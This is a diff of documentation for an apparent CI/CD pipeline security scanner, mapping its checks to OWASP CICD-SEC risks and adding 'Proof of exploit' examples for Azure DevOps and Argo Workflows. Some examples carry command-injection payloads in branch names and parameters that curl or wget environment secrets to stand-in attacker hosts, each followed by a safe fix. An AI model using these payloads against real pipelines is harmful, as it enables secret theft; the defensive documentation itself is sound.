 | [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
@@ -468,6 +498,7 @@ Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to
 | [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
 | [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
+| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
 | [`SM-001`](#detail-sm-001) | Secrets Manager secret has no rotation configured | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`SSM-001`](#detail-ssm-001) | SSM Parameter with secret-like name is not a SecureString | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`TF-001`](#detail-tf-001) | aws_iam_access_key declares a long-lived access key | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |
@@ -478,7 +509,7 @@ Plaintext secrets in YAML, env vars baked into image layers, or tokens echoed to
 
 Privileged containers, host mounts, root user, and disabled TLS turn a routine RCE in a build step into kernel-level access to the runner host.
 
-**Evidenced by 87 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, Tekton, Terraform).
+**Evidenced by 91 checks** across 16 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, CloudFormation, Dockerfile, Drone CI, GitHub Actions, GitLab CI, Jenkins, Kubernetes, Tekton, Terraform).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -515,6 +546,8 @@ Privileged containers, host mounts, root user, and disabled TLS turn a routine R
 | [`DF-015`](#detail-df-015) | RUN grants world-writable permissions (chmod 777 / a+w) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DF-017`](#detail-df-017) | ENV PATH prepends a world-writable directory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`DF-018`](#detail-df-018) | RUN chown rewrites ownership of a system path | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-023`](#detail-df-023) | ENV sets a dynamic-loader hijack variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
+| [`DF-024`](#detail-df-024) | RUN npm/yarn/pnpm install runs lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
 | [`DR-004`](#detail-dr-004) | Literal credential in step environment / settings | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Drone CI](../providers/drone.md) |  |
 | [`DR-011`](#detail-dr-011) | node map interpolates attacker-controllable Drone variable | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
 | [`ECR-004`](#detail-ecr-004) | No lifecycle policy configured | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
@@ -567,6 +600,8 @@ Privileged containers, host mounts, root user, and disabled TLS turn a routine R
 | [`K8S-038`](#detail-k8s-038) | NetworkPolicy ingress / egress allows all sources or destinations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-039`](#detail-k8s-039) | Pod uses shareProcessNamespace: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`K8S-040`](#detail-k8s-040) | Container securityContext.procMount: Unmasked | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
+| [`K8S-041`](#detail-k8s-041) | Service.externalIPs allows traffic interception (CVE-2020-8554) | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
+| [`K8S-043`](#detail-k8s-043) | Ingress rule has wildcard or missing host (catch-all) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
 | [`TF-003`](#detail-tf-003) | CodeBuild VPC shares its VPC with a public subnet | <span class="pg-sev pg-sev--high">HIGH</span> | [Terraform](../providers/terraform.md) |  |
 | [`TKN-005`](#detail-tkn-005) | Literal secret value in Tekton step env or param default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 
@@ -574,24 +609,34 @@ Privileged containers, host mounts, root user, and disabled TLS turn a routine R
 
 Calls to external services, SaaS integrations, marketplace actions, package registries, expand the trust perimeter of the pipeline beyond what was reviewed and approved.
 
-**Evidenced by 8 checks** across 2 providers (AWS, GitHub Actions).
+**Evidenced by 18 checks** across 6 providers (AWS, Azure DevOps, Bitbucket, CircleCI, GitHub Actions, SCM).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
+| [`ADO-001`](#detail-ado-001) | Task reference not pinned to specific version | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`BB-001`](#detail-bb-001) | pipe: action not pinned to exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`CA-003`](#detail-ca-003) | CodeArtifact domain policy allows cross-account wildcard | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
+| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
 | [`CCM-003`](#detail-ccm-003) | CodeCommit trigger targets SNS/Lambda in a different account | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
 | [`EB-002`](#detail-eb-002) | EventBridge rule has a wildcard target ARN | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
+| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
+| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-041`](#detail-gha-041) | Action upstream repo has a single contributor | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-042`](#detail-gha-042) | Action upstream repo is newly created | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
+| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
 | [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
 | [`LMB-002`](#detail-lmb-002) | Lambda function URL has AuthType=NONE | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
 | [`LMB-004`](#detail-lmb-004) | Lambda resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
+| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
 | [`SM-002`](#detail-sm-002) | Secrets Manager resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
 
 ### CICD-SEC-9: Improper Artifact Integrity Validation { #ctrl-cicd-sec-9 }
 
 Without provenance, attestations, signatures, or SBOMs, consumers (including production) cannot verify that the artifact running in production is the one the pipeline built.
 
-**Evidenced by 62 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).
+**Evidenced by 66 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
@@ -607,6 +652,10 @@ Without provenance, attestations, signatures, or SBOMs, consumers (including pro
 | [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
 | [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-006`](#detail-attest-006) | SLSA provenance lacks a meaningful buildType | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
 | [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
 | [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
@@ -662,11 +711,12 @@ Without provenance, attestations, signatures, or SBOMs, consumers (including pro
 
 When the pipeline doesn't log its decisions, audits stall and incident response lacks the timeline needed to scope a compromise.
 
-**Evidenced by 42 checks** across 8 providers (AWS, CircleCI, Cloud Build, Dockerfile, Jenkins, Kubernetes, OCI manifest, SCM).
+**Evidenced by 43 checks** across 8 providers (AWS, CircleCI, Cloud Build, Dockerfile, Jenkins, Kubernetes, OCI manifest, SCM).
 
 | Check | Title | Severity | Provider | Fix |
 |-------|-------|----------|----------|-----|
 | [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
+| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
 | [`CA-000`](#detail-ca-000) | CodeArtifact API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
 | [`CB-000`](#detail-cb-000) | CodeBuild API access failed | <span class="pg-sev pg-sev--info">INFO</span> | [AWS](../providers/aws.md) |  |
 | [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
@@ -715,7 +765,7 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 #### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }
 
-**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-8`](#ctrl-cicd-sec-8) Ungoverned Usage of 3rd-Party Services.
 
 **How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.
 
@@ -732,6 +782,41 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.
 
 **Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.
+
+**Proof of exploit.**
+
+# Vulnerable: PR title macro interpolated straight into script.
+trigger: none
+pr:
+  branches:
+    include: [main]
+jobs:
+  - job: triage
+    pool: { vmImage: ubuntu-latest }
+    steps:
+      - script: |
+          echo "New PR: $(System.PullRequest.SourceBranch)"
+          echo "Subject: $(Build.SourceVersionMessage)"
+
+# Attack: open a PR from a branch whose name carries shell:
+#
+#   git checkout -b 'foo";curl https://attacker/exfil \
+#     -d "$(printenv | base64)";echo "x'
+#
+# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
+# value's `"` closes the echo and the rest becomes shell.
+# The PR-validated pipeline has the same service-connection
+# credentials a main-branch build would have, so the curl
+# exfils every secret in scope. Classic pwn-request shape.
+
+# Safe: route through env so the value is never interpolated
+# into the shell template.
+      - bash: |
+          echo "New PR: $PR_BRANCH"
+          echo "Subject: $COMMIT_MSG"
+        env:
+          PR_BRANCH: $(System.PullRequest.SourceBranch)
+          COMMIT_MSG: $(Build.SourceVersionMessage)
 
 **Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -752,6 +837,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.
 
 **Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.
+
+**Known false positives.**
+
+- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.
 
 **Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).
 
@@ -861,6 +950,10 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Known false positives.**
+
+- Variable values that *reference* a secret rather than embed one (``$(MySecretVar)`` / ``$(AwsKey)`` mapped from a variable group backed by Key Vault) still match the ``AWS_ACCESS_KEY_ID`` / ``AWS_SECRET_ACCESS_KEY`` name regex because the variable name itself looks long-lived. The rule has no way to follow the binding to its source. Suppress per-pipeline via ``--ignore-file`` once you've confirmed the value is injected at runtime from a Key Vault group rather than stored in the YAML.
+
 **Source:** [`ADO-014`](../providers/azure.md#ado-014) in the [Azure DevOps provider](../providers/azure.md).
 
 #### `ADO-015`: Job has no `timeoutInMinutes`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-015 }
@@ -923,13 +1016,50 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 **Recommendation.** Pin the extends template to a protected repository ref (`template@ref`). Local templates in PR-validated pipelines can be poisoned by the PR author.
 
+**Proof of exploit.**
+
+# Vulnerable: PR-validated pipeline extends a LOCAL template.
+trigger: none
+pr:
+  branches: { include: [main] }
+extends:
+  template: templates/standard-build.yml   # no @repo ref
+
+# Attack: a PR author edits ``templates/standard-build.yml``
+# in their branch to inject any pipeline body they want.
+# The PR-validation run materializes the PR branch first,
+# THEN evaluates ``extends:`` against that tree, so the
+# attacker's template body runs with the pipeline's service
+# connections in scope.
+#
+# In the PR's templates/standard-build.yml:
+#   jobs:
+#     - job: exfil
+#       steps:
+#         - bash: |
+#             curl https://attacker.example/x \
+#               -d "$(printenv | base64 -w0)"
+#
+# No further trick needed, ``extends:`` is the gate and the
+# PR author controls what's behind it.
+
+# Safe: pin the template to a protected ref in a separate repo.
+resources:
+  repositories:
+    - repository: pipeline-templates
+      type: git
+      name: ProjectName/pipeline-templates
+      ref: refs/tags/v1.4.2     # immutable, signed tag
+extends:
+  template: templates/standard-build.yml@pipeline-templates
+
 **Source:** [`ADO-019`](../providers/azure.md#ado-019) in the [Azure DevOps provider](../providers/azure.md).
 
 #### `ADO-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-020 }
 
 **Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse.
 
-**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognises trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
+**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.
 
 **Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.
 
@@ -1058,6 +1188,43 @@ Every check that evidences this standard, rendered once with its detection mecha
 
 - Pipelines that intentionally select agent pools via a vetted ``variables:`` block (``POOL_NAME: prod-pool``) are out of scope, pipeline variables defined in the same file are author-controlled. Static custom names are not flagged. The rule only matches the curated runtime-macro catalog and the literal ``${{ parameters.X }}`` template-parameter shape.
 
+**Proof of exploit.**
+
+# Vulnerable: pool name computed from caller-controlled parameter.
+parameters:
+  - name: targetPool
+    type: string
+    default: linux-pool
+jobs:
+  - job: build
+    pool: { name: ${{ parameters.targetPool }} }
+    steps:
+      - bash: ./scripts/build.sh
+
+# Attack: the pipeline is queued via the REST API or a
+# downstream caller. Whoever supplies ``targetPool`` chooses
+# the agent fleet:
+#
+#   POST .../_apis/pipelines/42/runs
+#   { "templateParameters": { "targetPool": "signer-hsm" } }
+#
+# The attacker routes the job onto ``signer-hsm``, a privileged
+# self-hosted pool intended only for release signing. The
+# build script now executes on a host that has the signing key
+# mounted; ``./scripts/build.sh`` (or anything else the caller
+# also influences) can read the key and exfil it.
+
+# Safe: hard-code the pool, validate parameter against an
+# allowlist when parameterization is required.
+parameters:
+  - name: targetPool
+    type: string
+    default: linux-pool
+    values: [linux-pool, windows-pool]   # vetted allowlist
+jobs:
+  - job: build
+    pool: { name: ${{ parameters.targetPool }} }
+
 **Source:** [`ADO-030`](../providers/azure.md#ado-030) in the [Azure DevOps provider](../providers/azure.md).
 
 #### `ARGO-001`: Argo template container image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-001 }
@@ -1107,6 +1274,54 @@ Every check that evidences this standard, rendered once with its detection mecha
 **How this is detected.** Fires on any ``{{inputs.parameters.X}}``, ``{{workflow.parameters.X}}``, or ``{{item.X}}`` token inside a ``script.source`` body or a ``container.args`` string that isn't already wrapped in quotes. Doesn't fire on the env-var indirection pattern, which is safe.
 
 **Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.
+
+**Known false positives.**
+
+- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.
+
+**Proof of exploit.**
+
+# Vulnerable: webhook-triggered workflow interpolates a
+# user-supplied parameter directly into a shell script.
+apiVersion: argoproj.io/v1alpha1
+kind: Workflow
+metadata: { generateName: greet- }
+spec:
+  entrypoint: main
+  arguments:
+    parameters:
+      - name: who
+  templates:
+    - name: main
+      inputs: { parameters: [ { name: who } ] }
+      script:
+        image: alpine:3.20
+        command: [sh]
+        source: |
+          echo Hello {{inputs.parameters.who}}
+
+# Attack: a webhook caller (or anyone with Submit on the
+# WorkflowTemplate) supplies a parameter carrying shell:
+#
+#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
+#     -d "$(env|base64)";:'
+#
+# Argo substitutes the parameter BEFORE handing the source
+# to ``sh``, so the `;` ends the echo and the next command
+# runs. The pod inherits the workflow's ServiceAccount; if
+# that SA has any cluster privilege (mount, image-pull, kubectl)
+# the attacker now has it.
+
+# Safe: route through env so the shell only sees a quoted
+# expansion of a controlled-name variable.
+      script:
+        image: alpine:3.20
+        command: [sh]
+        env:
+          - name: WHO
+            value: '{{inputs.parameters.who}}'
+        source: |
+          echo "Hello $WHO"
 
 **Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).
 
@@ -1252,7 +1467,7 @@ Triggering this rule means the bytes of the runtime image were produced by a bui
 **Seen in the wild.**
 
 - [SLSA threat-model v1.0](https://slsa.dev/spec/v1.0/threats): untrusted builder is the canonical Build-track Threat #2 ('Build the package from a modified source'). A tampered self-hosted runner can emit a syntactically-valid attestation for the wrong source.
-- GitHub self-hosted runner advisory (CVE-2024-32004 et al.): self-hosted runners default to non-ephemeral, persisted state; a single fork-PR run gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build. SLSA's isolation requirement (L2+) explicitly excludes this shape.
+- [GitHub docs on self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security): non-ephemeral self-hosted runners default to persisted state between jobs; one compromised job gives the attacker arbitrary code execution that produces signed artifacts on every subsequent legitimate build on that runner. SLSA's isolation requirement (L2+) explicitly excludes this shape, which is why the rule treats ``self-hosted`` URIs as untrusted regardless of the rest of the chain.
 
 **Source:** [`ATTEST-001`](../providers/oci.md#attest-001) in the [OCI manifest provider](../providers/oci.md).
 
@@ -1280,7 +1495,7 @@ Fires when:
 
 **Seen in the wild.**
 
-- [SLSA threat-model v1.0, Source-track Threat #4](https://slsa.dev/spec/v1.0/threats) ('Build uses unauthorized source'): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes.
+- [SLSA v1.0 threat model](https://slsa.dev/spec/v1.0/threats) (Source-track threats): a builder pulling code from a fork or a different ref than the operator believes produces an attestation that signs the wrong bytes. The source-track threats catalog those source-substitution shapes that a pinned + verified source claim mitigates.
 - [SolarWinds Orion compromise](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) (December 2020): the build system pulled tampered source from an unauthorized branch via SUNSPOT, producing 'authentic' signed builds for code the development team never wrote. A pinned, verified source-repo claim is the control SLSA L2+ requires specifically to detect this shape.
 
 **Source:** [`ATTEST-002`](../providers/oci.md#attest-002) in the [OCI manifest provider](../providers/oci.md).
@@ -1307,9 +1522,225 @@ Detection walks every SBOM attestation (predicate types starting with ``https://
 
 **Source:** [`ATTEST-003`](../providers/oci.md#attest-003) in the [OCI manifest provider](../providers/oci.md).
 
+#### `ATTEST-004`: SLSA provenance ships without a resolved-dependencies set <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-attest-004 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
+
+**How this is detected.** Walks every SLSA provenance attestation on the image index and reads the materials list at the spec-version-appropriate path. Both v0.2 and v1 are accepted. A missing key, a non-list value, and an empty list all fail (each shape means the consumer gets no input chain-of-custody). Per-material content validation (digest map populated, URI well-formed) is deferred to a future rule, this one establishes that the list exists.
+
+Pairs with ATTEST-003: ATTEST-003 verifies the SBOM covers package-level inputs, ATTEST-004 verifies the build-level inputs. Both are needed for the SLSA Build-track L3 'isolated, reproducible' claim; SBOM-only coverage misses the resolved base image and the build-tool chain.
+
+**Recommendation.** Configure the builder to emit a non-empty ``materials`` (SLSA v0.2) or ``resolvedDependencies`` (SLSA v1) list with one entry per ingredient the build consumed. For BuildKit, set ``--attest=type=provenance,mode=max`` so the resolved-base-image + checked-out source land in the attestation. For slsa-github-generator the L3 presets populate this automatically; teams running a custom generator must add the inputs explicitly. An empty list is structurally indistinguishable from 'the build had no inputs' and breaks downstream vulnerability correlation.
+
+**Known false positives.**
+
+- Trivial ``FROM scratch`` images with no build-time dependencies legitimately have an empty materials list. The rule has no way to distinguish 'trivial build' from 'instrumentation gap', the SLSA spec treats both as the same fail-closed signal. Suppress per-image via ``--ignore-file`` once you've verified the build genuinely has nothing to attest.
+- Some builders (older BuildKit, hand-rolled generators) populate ``materials`` but omit the ``digest`` map, which the SLSA spec marks recommended-not-required. This rule accepts that shape today (list non-empty = pass); a future ATTEST-NNN will tighten to require digest coverage.
+
+**Seen in the wild.**
+
+- [SLSA v1 spec, Build track L3 requirements](https://slsa.dev/spec/v1.0/levels#build-l3): resolved dependencies are a Build-track requirement, not an optional courtesy. The provenance was supposed to answer 'what went into this artifact'; an empty resolvedDependencies list answers 'we declined to say', which is materially worse than 'we didn't produce an attestation' because consumers see a signed-and-stamped document and trust it.
+- tj-actions/changed-files compromise (CVE-2025-30066, March 2025): forensic teams reconstructing the blast radius needed to know which downstream images consumed the compromised action's outputs. Builds whose provenance carried materials lists pinpointed the exposure in minutes; builds without paid for the gap in days of manual review.
+
+**Proof of exploit.**
+
+# Vulnerable: a hand-rolled or older-Buildx provenance
+# emitter ships a Statement whose materials list is empty.
+# (Modern BuildKit ``--attest=type=provenance`` populates a
+# materials list by default; ``mode=max`` enriches it with
+# decoded build args / fuller layer metadata, but the
+# rule fires structurally on missing/empty regardless of
+# which emitter produced the output.)
+
+# Resulting provenance (SLSA v0.2 predicate):
+#   {
+#     "builder": {"id": "https://my-internal-ci/runner@v3"},
+#     "buildType": "https://example.com/buildtype/v1",
+#     "invocation": { ... configSource present ... },
+#     "materials": []          <-- empty
+#   }
+
+# Attack surface: a downstream CVE advisory for the
+# resolved base image (say, ubuntu:22.04 -> a specific
+# digest known to ship the vulnerable libcurl) can't be
+# correlated to this image because the provenance never
+# recorded which base image was resolved at build time.
+# Forensic response shifts from "grep provenance for
+# affected digest" to "rebuild every image and inspect
+# layer contents."
+
+# Safe: use a builder that emits resolved materials. For
+# BuildKit that's any recent Buildx with
+# ``--attest=type=provenance`` (default mode already
+# populates the list; pass ``mode=max`` if you also want
+# decoded build args + fuller layer metadata).
+$ docker buildx build \
+    --attest=type=provenance,mode=max \
+    --tag registry.example/app:v1.4.2 \
+    --push .
+
+# Resulting provenance:
+#   "materials": [
+#     {"uri": "pkg:docker/ubuntu@22.04",
+#      "digest": {"sha256": "<resolved digest>"}},
+#     {"uri": "git+https://github.com/foo/bar@v1.4.2",
+#      "digest": {"sha1": "<commit sha>"}}
+#   ]
+
+**Source:** [`ATTEST-004`](../providers/oci.md#attest-004) in the [OCI manifest provider](../providers/oci.md).
+
+#### `ATTEST-005`: In-toto Statement subject is missing or unpinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-attest-005 }
+
+**Evidences:** [`CICD-SEC-3`](#ctrl-cicd-sec-3) Dependency Chain Abuse, [`CICD-SEC-9`](#ctrl-cicd-sec-9) Improper Artifact Integrity Validation.
+
+**How this is detected.** Walks every parsed in-toto Statement (SLSA provenance + SBOM both) and validates the subject array. Three failure shapes:
+  - ``subject`` is missing or an empty list, the Statement attests nothing.
+  - A subject entry has no ``digest`` map, the entry names an artifact but doesn't bind to its bytes.
+  - A digest value is empty, all-zeros, or not valid hex, the bind exists structurally but the value is a placeholder.
+
